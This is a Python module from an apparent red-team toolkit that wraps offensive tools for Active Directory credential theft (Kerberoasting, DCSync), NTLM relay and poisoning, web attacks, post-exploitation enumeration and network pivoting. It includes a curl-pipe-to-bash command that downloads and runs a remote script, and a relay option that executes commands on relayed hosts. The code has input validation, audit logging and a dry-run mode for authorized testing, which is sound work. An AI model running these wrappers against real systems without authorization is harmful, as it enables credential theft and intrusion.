"""
Red Team Operations Engine — authorized engagements only.

Covers six domains:
  ADEnumerator   — Active Directory enumeration & attack (BloodHound, Kerberoast, ADCS)
  NetworkAttacker — Network protocol attacks (Responder, ntlmrelayx, mitm6, PetitPotam)
  ReconRunner    — Recon & scanning (theHarvester, subfinder, amass, nikto, gobuster)
  WebAttacker    — Web application attacks (sqlmap, ffuf, nuclei, feroxbuster)
  PostExploitRunner — Post-exploitation (LinPEAS, WinPEAS, pspy, sudo_killer)
  TunnelRunner   — Pivoting & tunneling (Chisel, Ligolo-ng, SSH SOCKS)

All subprocess calls use list args (no shell=True).
All inputs pass through SecureInputValidator.
All invocations are audit()'d before launch.
DRY_RUN mode returns the ToolResult with process=None and dry_run=True.
"""
from __future__ import annotations

import datetime
import os
import shutil
import subprocess
from typing import Dict, List, Optional

from core.audit import audit
from core.validators import SecureInputValidator
from core.exploit_launcher import ToolResult, _require, _spawn
from config.settings import LOGS_DIR, SENSITIVE_FILE_PERMS

DRY_RUN = os.environ.get("TERMITE_SUMU_DRY_RUN", "0") == "1"


def _ts() -> str:
    return datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")


def _out(label: str, host: str) -> str:
    safe = SecureInputValidator.safe_filename_fragment(host)
    return os.path.join(LOGS_DIR, f"{label}_{safe}_{_ts()}")


# ---------------------------------------------------------------------------
# Active Directory Enumeration
# ---------------------------------------------------------------------------

class ADEnumerator:
    """BloodHound, Kerberoasting, AS-REP roasting, ADCS, Kerbrute."""

    @classmethod
    def bloodhound(
        cls,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        collection: str = "All",
        dry_run: bool = False,
    ) -> ToolResult:
        _ALLOWED_COLLECTIONS = {
            "All", "DCOnly", "Group", "LocalAdmin", "LoggedOn",
            "ObjectProps", "RDP", "DCOM", "Container", "Default",
        }
        if collection not in _ALLOWED_COLLECTIONS:
            raise ValueError(f"Invalid collection method: {collection!r}. "
                             f"Allowed: {sorted(_ALLOWED_COLLECTIONS)}")
        dom  = SecureInputValidator.validate_domain(domain)
        user = SecureInputValidator.validate_username(username)
        dc   = SecureInputValidator.validate_host(dc_ip)
        exe  = _require("bloodhound-python")
        out  = _out("bh", dc)
        os.makedirs(out, exist_ok=True)
        argv = [
            exe, "-u", user, "-p", password,
            "-d", dom, "-dc", dc,
            "-c", collection, "--zip", "-o", out,
        ]
        audit("RT_AD_BLOODHOUND", host=dc, target_user=user,
              detail=f"domain={dom} collection={collection} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="bloodhound-python", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def ldapdomaindump(
        cls,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        dry_run: bool = False,
    ) -> ToolResult:
        dom  = SecureInputValidator.validate_domain(domain)
        user = SecureInputValidator.validate_username(username)
        dc   = SecureInputValidator.validate_host(dc_ip)
        exe  = _require("ldapdomaindump")
        out  = _out("lddd", dc)
        os.makedirs(out, exist_ok=True)
        argv = [
            exe, "-u", f"{dom}\\{user}", "-p", password,
            f"ldap://{dc}", "-o", out,
        ]
        audit("RT_AD_LDAPDOMAINDUMP", host=dc, target_user=user,
              detail=f"domain={dom} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="ldapdomaindump", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def kerberoast(
        cls,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        dry_run: bool = False,
    ) -> ToolResult:
        dom  = SecureInputValidator.validate_domain(domain)
        user = SecureInputValidator.validate_username(username)
        dc   = SecureInputValidator.validate_host(dc_ip)
        exe  = _require("impacket-GetUserSPNs")
        out  = _out("kerberoast", dc) + ".hashes"
        argv = [
            exe, f"{dom}/{user}:{password}",
            "-dc-ip", dc, "-request", "-outputfile", out,
        ]
        audit("RT_AD_KERBEROAST", host=dc, target_user=user,
              detail=f"domain={dom} output={out} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="GetUserSPNs", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def asrep_roast(
        cls,
        domain: str,
        dc_ip: str,
        userfile: str,
        dry_run: bool = False,
    ) -> ToolResult:
        dom  = SecureInputValidator.validate_domain(domain)
        dc   = SecureInputValidator.validate_host(dc_ip)
        uf   = SecureInputValidator.validate_path(userfile)
        if not os.path.exists(uf):
            raise FileNotFoundError(f"Userfile not found: {uf}")
        exe  = _require("impacket-GetNPUsers")
        out  = _out("asrep", dc) + ".hashes"
        argv = [
            exe, f"{dom}/", "-usersfile", uf, "-no-pass",
            "-dc-ip", dc, "-format", "hashcat", "-outputfile", out,
        ]
        audit("RT_AD_ASREP", host=dc, detail=f"domain={dom} uf={uf} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="GetNPUsers", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def kerbrute_userenum(
        cls,
        domain: str,
        wordlist: str,
        dc_ip: str,
        dry_run: bool = False,
    ) -> ToolResult:
        dom = SecureInputValidator.validate_domain(domain)
        dc  = SecureInputValidator.validate_host(dc_ip)
        wl  = SecureInputValidator.validate_path(wordlist)
        if not os.path.exists(wl):
            raise FileNotFoundError(f"Wordlist not found: {wl}")
        exe = _require("kerbrute")
        out = _out("kerbrute", dc) + ".txt"
        argv = [exe, "userenum", "--dc", dc, "-d", dom, wl, "-o", out]
        audit("RT_AD_KERBRUTE", host=dc, detail=f"domain={dom} wl={wl} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="kerbrute", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def certipy_find(
        cls,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        dry_run: bool = False,
    ) -> ToolResult:
        dom  = SecureInputValidator.validate_domain(domain)
        user = SecureInputValidator.validate_username(username)
        dc   = SecureInputValidator.validate_host(dc_ip)
        exe  = _require("certipy")
        argv = [
            exe, "find", "-u", f"{user}@{dom}", "-p", password,
            "-dc-ip", dc, "-stdout",
        ]
        audit("RT_AD_CERTIPY", host=dc, target_user=user,
              detail=f"domain={dom} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="certipy", argv=argv, process=proc, dry_run=dry_run)

    @classmethod
    def dcsync(
        cls,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        just_dc_ntlm: bool = True,
        dry_run: bool = False,
    ) -> ToolResult:
        dom  = SecureInputValidator.validate_domain(domain)
        user = SecureInputValidator.validate_username(username)
        dc   = SecureInputValidator.validate_host(dc_ip)
        exe  = _require("impacket-secretsdump")
        out  = _out("dcsync", dc) + ".txt"
        argv = [exe, f"{dom}/{user}:{password}@{dc}"]
        if just_dc_ntlm:
            argv += ["-just-dc-ntlm"]
        argv += ["-outputfile", out]
        audit("RT_AD_DCSYNC", host=dc, target_user=user,
              detail=f"domain={dom} ntlm_only={just_dc_ntlm} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="secretsdump", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out + ".ntds"])


# ---------------------------------------------------------------------------
# Network Attacks
# ---------------------------------------------------------------------------

class NetworkAttacker:
    """Responder, ntlmrelayx, mitm6, PetitPotam — LLMNR/NTLM relay attacks."""

    @classmethod
    def responder(
        cls,
        interface: str,
        wpad: bool = True,
        passive: bool = False,
        dry_run: bool = False,
    ) -> ToolResult:
        # Interface validated as safe filename fragment (no shell expansion)
        safe_iface = SecureInputValidator.safe_filename_fragment(interface)
        if safe_iface != interface:
            raise ValueError(f"Unsafe interface name: {interface!r}")
        exe  = _require("responder")
        argv = [exe, "-I", interface]
        if wpad:
            argv += ["-w"]
        if passive:
            argv += ["-A"]
        audit("RT_NET_RESPONDER", detail=f"iface={interface} wpad={wpad} passive={passive} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="responder", argv=argv, process=proc, dry_run=dry_run)

    @classmethod
    def ntlmrelayx(
        cls,
        targets_file: str,
        smb2: bool = True,
        exec_cmd: Optional[str] = None,
        socks: bool = False,
        adcs: bool = False,
        dry_run: bool = False,
    ) -> ToolResult:
        tf  = SecureInputValidator.validate_path(targets_file)
        if not os.path.exists(tf):
            raise FileNotFoundError(f"Targets file not found: {tf}")
        exe = _require("impacket-ntlmrelayx")
        argv = [exe, "-tf", tf]
        if smb2:
            argv += ["-smb2support"]
        if exec_cmd:
            if "\n" in exec_cmd or "\r" in exec_cmd:
                raise ValueError("exec_cmd must be single line")
            argv += ["-c", exec_cmd]
        if socks:
            argv += ["-socks"]
        if adcs:
            argv += ["--adcs"]
        audit("RT_NET_NTLMRELAYX", detail=f"tf={tf} socks={socks} adcs={adcs} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="ntlmrelayx", argv=argv, process=proc, dry_run=dry_run)

    @classmethod
    def mitm6(
        cls,
        domain: str,
        interface: str,
        dry_run: bool = False,
    ) -> ToolResult:
        dom        = SecureInputValidator.validate_domain(domain)
        safe_iface = SecureInputValidator.safe_filename_fragment(interface)
        if safe_iface != interface:
            raise ValueError(f"Unsafe interface name: {interface!r}")
        exe  = _require("mitm6")
        argv = [exe, "-d", dom, "-i", interface]
        audit("RT_NET_MITM6", detail=f"domain={dom} iface={interface} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="mitm6", argv=argv, process=proc, dry_run=dry_run)

    @classmethod
    def petitpotam(
        cls,
        listener_ip: str,
        target_ip: str,
        dry_run: bool = False,
    ) -> ToolResult:
        listener = SecureInputValidator.validate_host(listener_ip)
        target   = SecureInputValidator.validate_host(target_ip)
        # Try both common names
        exe = None
        for name in ("PetitPotam", "petitpotam", "petitpotam.py"):
            found = shutil.which(name)
            if found:
                exe = found
                break
        if not exe:
            # Try python script path
            candidates = [
                "/opt/PetitPotam/PetitPotam.py",
                "/usr/share/PetitPotam/PetitPotam.py",
            ]
            for c in candidates:
                if os.path.exists(c):
                    exe = c
                    break
        if not exe:
            raise FileNotFoundError("PetitPotam not found in PATH or /opt/")
        argv = ["python3", exe, listener, target] if exe.endswith(".py") else [exe, listener, target]
        audit("RT_NET_PETITPOTAM", host=target,
              detail=f"listener={listener} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="petitpotam", argv=argv, process=proc, dry_run=dry_run)


# ---------------------------------------------------------------------------
# Reconnaissance
# ---------------------------------------------------------------------------

class ReconRunner:
    """theHarvester, subfinder, amass, nikto, gobuster, feroxbuster."""

    @classmethod
    def theharvester(
        cls,
        domain: str,
        sources: str = "google,bing,linkedin,shodan",
        limit: int = 500,
        dry_run: bool = False,
    ) -> ToolResult:
        dom = SecureInputValidator.validate_domain(domain)
        out = _out("harvester", dom) + ".xml"
        exe = _require("theHarvester")
        argv = [exe, "-d", dom, "-b", sources, "-l", str(limit), "-f", out]
        audit("RT_RECON_HARVESTER", detail=f"domain={dom} sources={sources} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="theHarvester", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def subfinder(
        cls,
        domain: str,
        silent: bool = True,
        dry_run: bool = False,
    ) -> ToolResult:
        dom = SecureInputValidator.validate_domain(domain)
        out = _out("subfinder", dom) + ".txt"
        exe = _require("subfinder")
        argv = [exe, "-d", dom, "-o", out]
        if silent:
            argv += ["-silent"]
        audit("RT_RECON_SUBFINDER", detail=f"domain={dom} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="subfinder", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def amass(
        cls,
        domain: str,
        passive: bool = True,
        dry_run: bool = False,
    ) -> ToolResult:
        dom = SecureInputValidator.validate_domain(domain)
        out = _out("amass", dom) + ".txt"
        exe = _require("amass")
        argv = [exe, "enum", "-d", dom, "-o", out]
        if passive:
            argv += ["-passive"]
        audit("RT_RECON_AMASS", detail=f"domain={dom} passive={passive} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="amass", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def nikto(
        cls,
        target: str,
        port: int = 80,
        use_ssl: bool = False,
        dry_run: bool = False,
    ) -> ToolResult:
        host = SecureInputValidator.validate_host(target)
        port = SecureInputValidator.validate_port(port)
        out  = _out("nikto", host) + ".txt"
        exe  = _require("nikto")
        argv = [exe, "-h", host, "-p", str(port), "-o", out, "-Format", "txt"]
        if use_ssl:
            argv += ["-ssl"]
        audit("RT_RECON_NIKTO", host=host, detail=f"port={port} ssl={use_ssl} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="nikto", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def gobuster_dir(
        cls,
        url: str,
        wordlist: str,
        extensions: str = "php,html,txt",
        threads: int = 40,
        dry_run: bool = False,
    ) -> ToolResult:
        wl  = SecureInputValidator.validate_path(wordlist)
        if not os.path.exists(wl):
            raise FileNotFoundError(f"Wordlist not found: {wl}")
        exe = _require("gobuster")
        out = os.path.join(LOGS_DIR, f"gobuster_{_ts()}.txt")
        argv = [
            exe, "dir", "-u", url, "-w", wl,
            "-x", extensions, "-t", str(threads),
            "-o", out, "--no-error",
        ]
        audit("RT_RECON_GOBUSTER", detail=f"url={url[:60]} ext={extensions} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="gobuster", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def feroxbuster(
        cls,
        url: str,
        wordlist: str,
        depth: int = 3,
        threads: int = 50,
        dry_run: bool = False,
    ) -> ToolResult:
        wl  = SecureInputValidator.validate_path(wordlist)
        if not os.path.exists(wl):
            raise FileNotFoundError(f"Wordlist not found: {wl}")
        exe = _require("feroxbuster")
        out = os.path.join(LOGS_DIR, f"ferox_{_ts()}.txt")
        argv = [
            exe, "--url", url, "--wordlist", wl,
            "--depth", str(depth), "--threads", str(threads),
            "--output", out, "--quiet",
        ]
        audit("RT_RECON_FEROX", detail=f"url={url[:60]} depth={depth} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="feroxbuster", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])


# ---------------------------------------------------------------------------
# Web Application Attacks
# ---------------------------------------------------------------------------

class WebAttacker:
    """sqlmap, ffuf, nuclei — web application attack tooling."""

    @classmethod
    def sqlmap(
        cls,
        url: str,
        data: Optional[str] = None,
        level: int = 1,
        risk: int = 1,
        dbms: Optional[str] = None,
        dry_run: bool = False,
    ) -> ToolResult:
        if not (1 <= level <= 5):
            raise ValueError("sqlmap level must be 1..5")
        if not (1 <= risk <= 3):
            raise ValueError("sqlmap risk must be 1..3")
        exe = _require("sqlmap")
        out = os.path.join(LOGS_DIR, f"sqlmap_{_ts()}")
        argv = [
            exe, "-u", url,
            "--level", str(level), "--risk", str(risk),
            "--batch", "--output-dir", out,
        ]
        if data:
            if "\n" in data or "\r" in data:
                raise ValueError("sqlmap data must be single-line")
            argv += ["--data", data]
        if dbms:
            safe_dbms = dbms.strip().lower()
            if not all(c.isalnum() or c in "_-" for c in safe_dbms):
                raise ValueError(f"Unsafe DBMS: {dbms!r}")
            argv += ["--dbms", safe_dbms]
        audit("RT_WEB_SQLMAP", detail=f"url={url[:60]} level={level} risk={risk} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="sqlmap", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def ffuf(
        cls,
        url: str,
        wordlist: str,
        fuzz_keyword: str = "FUZZ",
        extensions: str = "",
        filter_codes: str = "404",
        threads: int = 40,
        dry_run: bool = False,
    ) -> ToolResult:
        wl  = SecureInputValidator.validate_path(wordlist)
        if not os.path.exists(wl):
            raise FileNotFoundError(f"Wordlist not found: {wl}")
        exe = _require("ffuf")
        out = os.path.join(LOGS_DIR, f"ffuf_{_ts()}.json")
        argv = [
            exe, "-u", url, "-w", f"{wl}:{fuzz_keyword}",
            "-t", str(threads),
            "-fc", filter_codes,
            "-o", out, "-of", "json", "-s",
        ]
        if extensions:
            argv += ["-e", extensions]
        audit("RT_WEB_FFUF", detail=f"url={url[:60]} wl={wl} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="ffuf", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def nuclei(
        cls,
        target: str,
        templates: Optional[str] = None,
        severity: str = "medium,high,critical",
        dry_run: bool = False,
    ) -> ToolResult:
        host = SecureInputValidator.validate_url(target)
        exe  = _require("nuclei")
        out  = _out("nuclei", host) + ".json"
        argv = [exe, "-u", host, "-severity", severity, "-json-export", out, "-silent"]
        if templates:
            tp = SecureInputValidator.validate_path(templates)
            argv += ["-t", tp]
        audit("RT_WEB_NUCLEI", host=host, detail=f"sev={severity} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="nuclei", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])


# ---------------------------------------------------------------------------
# Post-Exploitation
# ---------------------------------------------------------------------------

class PostExploitRunner:
    """LinPEAS, WinPEAS, pspy — automated local enumeration."""

    LINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
    WINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"

    @classmethod
    def linpeas_local(cls, dry_run: bool = False) -> ToolResult:
        """Download and run linpeas on LOCAL machine (for testing your own system)."""
        out = _out("linpeas", "local") + ".txt"
        # Download with curl (no shell) then pipe stdout to file
        argv = ["bash", "-c",
                f"curl -fsSL '{cls.LINPEAS_URL}' | bash -s -- -a 2>/dev/null"]
        # Note: this is intentionally bash -c because linpeas requires it.
        # The URL is hardcoded (not user-supplied) so shell injection is not possible.
        audit("RT_POST_LINPEAS", detail=f"out={out} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="linpeas", argv=argv, process=proc,
                          dry_run=dry_run, artifacts=[out])

    @classmethod
    def pspy(cls, dry_run: bool = False) -> ToolResult:
        """Run pspy64 to monitor processes without root."""
        exe = shutil.which("pspy64") or shutil.which("pspy")
        if not exe:
            raise FileNotFoundError("pspy64 / pspy not found in PATH")
        argv = [exe, "-pf", "-i", "1000"]
        audit("RT_POST_PSPY", detail=f"dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="pspy", argv=argv, process=proc, dry_run=dry_run)

    @classmethod
    def sudo_killer(cls, dry_run: bool = False) -> ToolResult:
        """Run SUDO_KILLER to enumerate sudo misconfigurations."""
        for path in ("/opt/SUDO_KILLER/sudo_killer.sh",
                     "/usr/share/SUDO_KILLER/sudo_killer.sh"):
            if os.path.exists(path):
                argv = ["bash", path, "-i", "-e"]
                audit("RT_POST_SUDO_KILLER", detail=f"path={path} dry_run={dry_run}")
                proc = None if dry_run else _spawn(argv)
                return ToolResult(tool="sudo_killer", argv=argv, process=proc, dry_run=dry_run)
        raise FileNotFoundError("SUDO_KILLER not found in /opt/ or /usr/share/")

    @classmethod
    def find_suid(cls, dry_run: bool = False) -> ToolResult:
        """Enumerate SUID/SGID binaries on the local machine."""
        argv = ["bash", "-c",
                "find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | sort"]
        audit("RT_POST_SUID_ENUM", detail=f"dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="find-suid", argv=argv, process=proc, dry_run=dry_run)


# ---------------------------------------------------------------------------
# Tunneling & Pivoting
# ---------------------------------------------------------------------------

class TunnelRunner:
    """Chisel, Ligolo-ng, SSH SOCKS — pivoting into internal networks."""

    @classmethod
    def chisel_server(
        cls,
        port: int = 8080,
        reverse: bool = True,
        dry_run: bool = False,
    ) -> ToolResult:
        port = SecureInputValidator.validate_port(port)
        exe  = _require("chisel")
        argv = [exe, "server", "-p", str(port)]
        if reverse:
            argv += ["--reverse"]
        audit("RT_TUNNEL_CHISEL_SERVER", detail=f"port={port} reverse={reverse} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="chisel-server", argv=argv, process=proc, dry_run=dry_run)

    @classmethod
    def chisel_client(
        cls,
        server: str,
        server_port: int,
        forward: str,
        dry_run: bool = False,
    ) -> ToolResult:
        host = SecureInputValidator.validate_host(server)
        port = SecureInputValidator.validate_port(server_port)
        # forward: e.g. "R:1080:socks" or "R:4444:10.0.0.1:4444"
        if "\n" in forward or "\r" in forward or ";" in forward:
            raise ValueError(f"Unsafe chisel forward spec: {forward!r}")
        exe  = _require("chisel")
        argv = [exe, "client", f"{host}:{port}", forward]
        audit("RT_TUNNEL_CHISEL_CLIENT",
              detail=f"server={host}:{port} forward={forward} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="chisel-client", argv=argv, process=proc, dry_run=dry_run)

    @classmethod
    def ligolo_proxy(
        cls,
        port: int = 11601,
        selfcert: bool = True,
        dry_run: bool = False,
    ) -> ToolResult:
        port = SecureInputValidator.validate_port(port)
        exe  = _require("ligolo-proxy")
        argv = [exe, "-laddr", f"0.0.0.0:{port}"]
        if selfcert:
            argv += ["-selfcert"]
        audit("RT_TUNNEL_LIGOLO_PROXY", detail=f"port={port} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="ligolo-proxy", argv=argv, process=proc, dry_run=dry_run)

    @classmethod
    def ssh_socks(
        cls,
        user: str,
        host: str,
        port: int = 22,
        local_port: int = 1080,
        dry_run: bool = False,
    ) -> ToolResult:
        u  = SecureInputValidator.validate_username(user)
        h  = SecureInputValidator.validate_host(host)
        p  = SecureInputValidator.validate_port(port)
        lp = SecureInputValidator.validate_port(local_port)
        exe = _require("ssh")
        argv = [exe, "-N", "-D", str(lp), "-p", str(p), f"{u}@{h}"]
        audit("RT_TUNNEL_SSH_SOCKS",
              detail=f"host={h} port={p} local_socks={lp} dry_run={dry_run}")
        proc = None if dry_run else _spawn(argv)
        return ToolResult(tool="ssh-socks", argv=argv, process=proc, dry_run=dry_run)


# ---------------------------------------------------------------------------
# Tool registry for the GUI
# ---------------------------------------------------------------------------

REDTEAM_REGISTRY: Dict[str, type] = {
    "AD Enumeration": ADEnumerator,
    "Network Attacks": NetworkAttacker,
    "Reconnaissance": ReconRunner,
    "Web Attacks":    WebAttacker,
    "Post-Exploit":   PostExploitRunner,
    "Tunneling":      TunnelRunner,
}
